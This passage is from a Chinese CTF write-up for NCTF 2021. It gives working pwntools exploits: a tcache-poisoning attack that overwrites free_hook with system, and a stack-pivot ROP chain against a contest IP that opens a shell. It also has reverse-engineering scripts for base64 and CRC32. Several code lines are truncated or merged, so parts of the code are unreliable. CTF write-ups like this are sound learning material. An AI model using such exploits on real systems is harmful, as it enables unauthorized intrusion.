        menu(2)
        sh.recvuntil(': ')
        sh.sendline(str(idx))
        sh.recvuntil(': ')
        sh.send(content)
    def delte(idx):
        menu(3)
        sh.recvuntil(': ')
        sh.sendline(str(idx))
    def show(idx):
        menu(4)
        sh.recvuntil(': ')
        sh.sendline(str(idx))
    for i in range(30):
        add(0x70, b'a'*0x70)
    delte(0)
    show(0)
    heap_base = u64(sh.recv(8)) > 12))+b'\n')
    add(0x70, b'a'*0x70)
    add(0x70, b'a'*0x70)
    add(0x70, p64(0) + p64(0x481) + b'\n')
    delte(0)
    show(0)
    libc_base = u64(sh.recv(8)) - 0x1e0c00
    log.success('libc_base: ' + hex(libc_base))
    system = libc_base + 0x00000000004fa60
    binsh_str = libc_base + 0x00000000001abf05
    free_hook = libc_base + 0x0000000001e3e20
    add(0x70, 'c'*0x70)
    delte(0)
    edit(15, p64((0) ^ (heap_base >> 12)) + p64(0)+b'\n')
    delte(0)
    edit(15, p64((0) ^ (heap_base >> 12)) + p64(0)+b'\n')
    delte(0)
    edit(15, p64((free_hook) ^ (heap_base >> 12))+b'\n')
    add(0x70, b'a'*0x70)
    add(0x70, p64(system) + b'\n')
    add(0x20, '/bin/sh\x00')
    delte(15)
    sh.interactive()
###  login
> 题目描述:
>  
>  
>     Welcome, it's ez
>     nc 129.211.173.64 10005
>  
>
> 附件链接:
>  
>  
>     http://download.kagehutatsu.com/Download/login.zip
>     https://attachment.h4ck.fun:9000/pwn/login/login.zip
>     https://nctf.slight-wind.com/pwn/login/login.zip
>  
栈溢出，使用栈迁移，然后调用syscall
    from pwn import *
    # sh = process('./login')
    sh = remote('129.211.173.64',10005)
    syscall = 0x0000000000110628
    close_plt = 0x401090
    bin_sh_addr = 0x404800
    retn_addr = 0x401220
    pop_rsi_r15_ret = 0x0000000000401291
    pop_rdi_ret = 0x0000000000401293
    addr = 0x40128A
    read_plt = 0x4010A0
    # gdb.attach(sh)
    sh.recvuntil('Welcome to NCTF2021!\n')
    bss = 0x404500
    main = 0x4011ED
    payload = b'a'*0x100
    payload += p64(bss)
    payload += p64(main)
    sh.send(payload)
    # sh.recvuntil('Welcome to NCTF2021!\n')
    sleep(0.2)
    payload = p64(0) + p64(1) + p64(0) + p64(0x0000000000404028)
    payload += p64(0x2) + p64(0x404400 + 0x38) + p64(0x401270) + p64(read_plt) 
    payload += p64(0) + p64(1) + p64(0) + p64(0x404900) + p64(0x3b) + p64(0x404400 + 0x78) + p64(0x401270) + p64(read_plt)
    payload += p64(0) + p64(0x4044f8) + p64(0x4044f8) + p64(0) + p64(0) + p64(0x404400 + 0xb8) + p64(0x401270) + p64(close_plt)
    payload = payload.ljust(0xf8, b'a') + b'/bin/sh\x00'
    sh.send(payload + p64(bss - 0x110) + p64(0x4011ED))
    sleep(0.2)
    payload = b'a' * 0x108 + p64(0x40128A)
    sh.send(payload)
    sleep(0.5)
    sh.send(b'\x28\x56')
    sleep(0.5)
    sh.send(b'a' * 0x3b)
    sh.interactive()
    '''
    0xe6c7e execve("/bin/sh", r15, r12)
    constraints:
      [r15] == NULL || r15 == NULL
      [r12] == NULL || r12 == NULL
    0xe6c81 execve("/bin/sh", r15, rdx)
    constraints:
      [r15] == NULL || r15 == NULL
      [rdx] == NULL || rdx == NULL
    0xe6c84 execve("/bin/sh", rsi, rdx)
    constraints:
      [rsi] == NULL || rsi == NULL
      [rdx] == NULL || rdx == NULL
    0x270b3
    '''
## Reverse
###  Hello せかい
> 题目描述:
>  
>  
>     欢迎来到NCTF-逆向工程(Reverse Engineering)
>
>     这里可能有你需要的工具:
>     ida pro 7.6 :链接：https://pan.baidu.com/s/1bV2HjBBX0bwwtzORqhErOg 提取码：o49x
>  
>
> 附件链接:
>  
>  
>     链接：https://pan.baidu.com/s/1qPHbnzNrg-8ocG2CkYh_4w
>     提取码：mbxp
>
> https://attachment.h4ck.fun:9000/reverse/Hello%20%E3%81%9B%E3%81%8B%E3%81%84/WelcomeToNCTF-> RE.zip
>     https://nctf.slight-> wind.com/reverse/Hello%20%E3%81%9B%E3%81%8B%E3%81%84/WelcomeToNCTF-RE.zip
>  
flag 如图所示
###  Shadowbringer
> 题目描述:
>  
>  
>     One brings shadow, one brings light.
>     Two-toned echoes, tumbling through time.
>     Threescore wasted, ten cast aside.
>     Four-fold knowing, no end in sight.
>     ---EZCPP FOR YOU, JUST HAVE FUN!--->  
>
> 附件链接:
>  
>  
>     链接：http://39.102.33.27:5212/#/s/rwSw
>     https://upyun.clq0.top/Shadowbringer.exe
>  
本质上为自制双重base64，连续修改了俩表，反过来运算即可
    table = "#$%&'()*+,-.s0123456789:;?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[h]^_`ab"
    # ans_index = [8, 59, 1, 32, 7, 52, 9, 31, 24, 36, 19, 3, 16, 56, 9, 27, 8, 52, 19, 2, 8, 34, 18, 3, 5, 6, 18, 3, 15, 34, 18, 23, 8, 1, 41, 34, 6, 36, 50, 36, 15, 31,43, 36, 3, 21, 65, 65]
    # table = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/="
    def find_real_string():
        return ''.join(table[i-1] for i in ans_index)
    #!/usr/bin/env python3
    def myBase64Encode(preCoding):
        charTable = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/' #字符表
        if len(preCoding) ?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[h]^_`ab\x00" #字符表
        #如果字符不是4的倍数 返回空
        if not len(encodedBin) % 4 == 0 :
            return ''
        tCode = '' #用于存放最终的二进制文本字符串
        pCpde = '' #暂存变量
        #遍历encodedBin每一个字符
        for i in encodedBin:
            for j in range(len(charTable)): #找到表中对应坐标
                if chr(i) == charTable[j]:
                    pCode = bin(j)[2 :]  #转二进制去除开头的0b
                    lackZeroNums = 6 - len(pCode) #省略的0的个数
                    for x in range(lackZeroNums):
                        pCode = '0' + pCode
                    tCode = tCode + pCode
        pCode = ''
        result = '' #储存最终结果
        print(tCode)
        for i in range(int(len(tCode) / 8)):
            pCode = tCode[i * 8 : i * 8 + 8]
            result = result + chr(int(pCode, 2))
        return bytes(result, encoding = "utf-8")
    # print(myBase64Encode(b"helloworld"))
    # print(myBase64Decode(b"U>F2UsQXN`5sXMELT=:7M_2 题目描述:
>  
>  
>     听说这是狗狗的秘密
>  
>
> 附件链接:
>  
>  
>     链接：http://39.102.33.27:5212/#/s/D3Un
>     https://upyun.clq0.top/attachment_1.exe
>  
用了一个一次执行一句话的汇编实现的CRC32，爆破即可获得答案:
    import zlib
    result = [  -1057595298,
      11628042,
      857318098,
      1472903095,
      -1704694372,
      -1109907674,
      -667354223,
      -1914631245,
      392891821,
      1751113455,
      740292529,
      1816412822,
      -1587741040,
      550340385,
      1654029544,
      739656189,
      1462570906,
      -1370301396,
      1346993615,
      -9781430]
    def find_str(index):
        for i in range(128):
            for j in range(128):
                tmp = bytes([i,j])
                res = zlib.crc32(tmp) % (1<<32)
                if res == (result[index] % (1<<32)):
                    return chr(i)+chr(j)
                # else:
                #     return "ERROR"
    index = 0
    ans = ''
    while index < len(result):
        ans += find_str(index)
        index += 1
        print(index)
    print(ans)
## 小结
啊啊啊啊啊，这比赛 web 题目太难了吧！！！！
Misc 那个 python 过滤 `(` 下的命令执行还是挺有意思的，学到了许多。
Web 咋一堆 Java 啊，欺负咱玩不来 Java，嘤嘤嘤。还有俩 XSS，一个 NodeJS 一个
Golang，本来还想做做的，试了试不会，看了提示根本没想到是啥东西，摸了，太顶了！
Reverse 有个 mobile 的题目，看 wp 应该比 web 简单，要不是他排在最后一题的位置，早知道就去看他了（害，不就是喵喵太菜了想多做几题
web，Crypto 咱也不会，唉
大家看看 web 最后的解题情况，来自群友的截图——
怎么说呢，本来还说想来恰烂钱的，结果啥也没恰到，好亏啊啊啊啊！摆烂了摆烂了。
当然，还要感谢队友和喵喵一起来玩。
还是要好好学习学习喵。
欢迎各位大师傅们来 [咱博客](https://miaotony.xyz/?utm_source=anquanke) 逛逛喵~
_（溜了溜了喵~_